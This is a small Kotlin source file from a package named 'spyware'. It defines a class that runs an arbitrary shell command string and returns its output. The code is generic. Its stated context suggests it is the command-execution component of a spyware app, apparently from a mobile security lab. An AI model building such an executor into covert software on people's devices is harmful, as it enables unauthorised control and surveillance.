package com.mhl.spyware

import java.io.BufferedReader
import java.io.InputStreamReader

class ShellCommandExecutor {

    fun execute(command: String): String {
        return try {
            val commandParts = command.split(" ")
            val processBuilder = ProcessBuilder(commandParts)
            processBuilder.redirectErrorStream(true) // Combine stdout and stderr
            val process = processBuilder.start()


            val output = BufferedReader(InputStreamReader(process.inputStream)).use { reader ->
                reader.readText()
            }

            process.waitFor() // Wait for the process to complete
            output
        } catch (e: Exception) {
            "Error executing command: ${e.message}"
        }
    }
}
